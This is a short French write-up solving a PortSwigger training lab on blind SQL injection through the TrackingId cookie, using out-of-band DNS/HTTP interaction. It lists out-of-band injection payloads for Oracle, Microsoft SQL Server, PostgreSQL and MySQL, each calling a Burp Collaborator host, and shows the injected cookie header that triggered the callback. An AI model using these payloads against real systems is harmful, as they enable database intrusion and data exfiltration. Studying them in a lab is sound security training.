# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

## Solution

Le cookie `TrackingId` est potentiellement vulnérable car vu dans d'autres lab.

Sauf que cette fois, l'injection est aveugle et on a pas de retour direct.

On peut tenté de récupérer des données en utilisant une requête DNS.

Sur la cheatsheet de PortSwigger, on trouve les requêtes suivantes :

- Oracle
  - `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
- Microsoft
  - `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`
  - `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`
- PostgreSQL
  - `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`
- MySQL
  - `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
  - `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

On teste la première :

```http
Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//i5oj8k6dshj2hkd8943moenj8ae12xqm.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

Et bingo, on a un retour dans Burp Collaborator, le lab est validé.